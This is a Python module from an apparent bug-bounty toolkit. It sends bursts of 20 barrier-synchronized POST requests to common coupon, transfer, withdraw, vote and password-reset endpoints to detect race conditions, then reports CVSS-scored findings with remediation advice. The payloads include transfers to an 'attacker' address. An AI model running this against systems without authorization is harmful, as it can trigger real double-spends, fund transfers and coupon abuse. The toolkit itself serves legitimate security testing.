# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""Race Conditions — concurrent request flood with synchronized barrier."""

import urllib.parse
import urllib.request
import urllib.error
import threading
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

RACE_ENDPOINTS = [
    ("/api/coupon/apply",    {"coupon": "DISCOUNT10", "code": "FREE10"}),
    ("/api/voucher/redeem",  {"voucher": "FREESHIP", "code": "VOUCHER"}),
    ("/api/transfer",        {"amount": "50", "to": "attacker@test.com"}),
    ("/api/payment",         {"amount": "1", "currency": "USD"}),
    ("/api/purchase",        {"item_id": "1", "qty": "1"}),
    ("/api/vote",            {"item_id": "1", "value": "1"}),
    ("/api/like",            {"post_id": "1"}),
    ("/api/rate",            {"item_id": "1", "rating": "5"}),
    ("/api/withdraw",        {"amount": "10"}),
    ("/api/redeem",          {"code": "REWARD10"}),
    ("/api/claim",           {"reward_id": "1"}),
    ("/api/register",        {"username": "racetest", "email": "r@test.com", "password": "Test123!"}),
    ("/api/invite",          {"email": "invite@test.com"}),
    ("/api/reset-password",  {"email": "admin@test.com"}),
    ("/api/v1/coupon",       {"coupon": "SAVE20"}),
    ("/api/v1/transfer",     {"amount": "1", "to": "test"}),
    ("/coupon/apply",        {"code": "FREE"}),
    ("/promo",               {"promo": "TEST"}),
]

CONCURRENT = 20
CVSS_HIGH = "8.1 (High) — CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS_MED  = "6.8 (Medium) — CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"


def _fire_barrier(url: str, payload: dict, n: int, timeout: int) -> list[dict]:
    results = []
    lock = threading.Lock()
    barrier = threading.Barrier(n)

    def _req(i):
        data = json.dumps(payload).encode()
        try:
            barrier.wait(timeout=5)
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/json")
            req.add_header("User-Agent", f"BugBountyTool/1.0 thread-{i}")
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read(500).decode("utf-8", errors="replace")
                with lock:
                    results.append({"status": r.status, "body": body, "thread": i})
        except urllib.error.HTTPError as e:
            with lock:
                results.append({"status": e.code, "body": "", "thread": i})
        except Exception as e:
            with lock:
                results.append({"status": 0, "error": str(e)[:50], "thread": i})

    threads = [threading.Thread(target=_req, args=(i,)) for i in range(n)]
    for t in threads:
        t.daemon = True
        t.start()
    for t in threads:
        t.join(timeout=timeout + 5)
    return results


def _check_endpoint(base_url: str, path: str, payload: dict, timeout: int) -> list[dict]:
    findings = []
    url = base_url.rstrip("/") + path
    probe = fetch_url(url, timeout=timeout)
    if not probe or probe.get("status") not in (200, 201, 400, 404, 405, 422, 500):
        return findings

    results = _fire_barrier(url, payload, CONCURRENT, timeout)
    success_results = [r for r in results if r.get("status") in (200, 201)]
    success_count = len(success_results)

    if success_count < 2:
        return findings

    # Check if all success responses are identical (idempotent) or different (race)
    bodies = [r["body"][:80] for r in success_results]
    unique_bodies = set(bodies)
    sev = "CRITICAL" if (len(unique_bodies) > 1 or success_count >= 5) else "HIGH"
    cvss = CVSS_HIGH

    findings.append({
        "type": "Race Condition",
        "severity": sev,
        "url": url,
        "concurrent_requests": CONCURRENT,
        "successful_responses": success_count,
        "unique_response_bodies": len(unique_bodies),
        "cvss": cvss,
        "description": (
            f"Race condition at '{path}': {success_count}/{CONCURRENT} concurrent requests "
            f"returned 2xx — endpoint not atomic."
            + (" Responses varied — non-atomic state confirmed." if len(unique_bodies) > 1 else "")
        ),
        "steps_to_reproduce": (
            f"1. Send {CONCURRENT} simultaneous POST requests to {url}\n"
            "2. Use threading.Barrier for synchronized release\n"
            f"3. Observe {success_count} requests returned 2xx success\n"
            "4. Coupon/vote/transfer applied multiple times."
        ),
        "impact": "Coupon reuse, vote manipulation, double-spend, duplicate resource creation.",
        "recommendation": (
            "Use database-level locking (SELECT FOR UPDATE, atomic compare-and-swap). "
            "Use Redis SETNX for distributed locks. Implement idempotency keys. "
            "Validate state before and after with a single atomic transaction."
        ),
    })
    return findings


def run(base_url: str, domain: str = "", timeout: int = 6, threads: int = 5, **kwargs) -> dict:
    findings: list[dict] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(_check_endpoint, base_url, path, payload, timeout)
                   for path, payload in RACE_ENDPOINTS]
        for fut in as_completed(futures):
            findings.extend(fut.result())
    return {
        "findings": findings,
        "summary": {
            "endpoints_checked": len(RACE_ENDPOINTS),
            "concurrent_requests_per_test": CONCURRENT,
            "vulnerable_endpoints": len(findings),
        },
    }


if __name__ == "__main__":
    pass
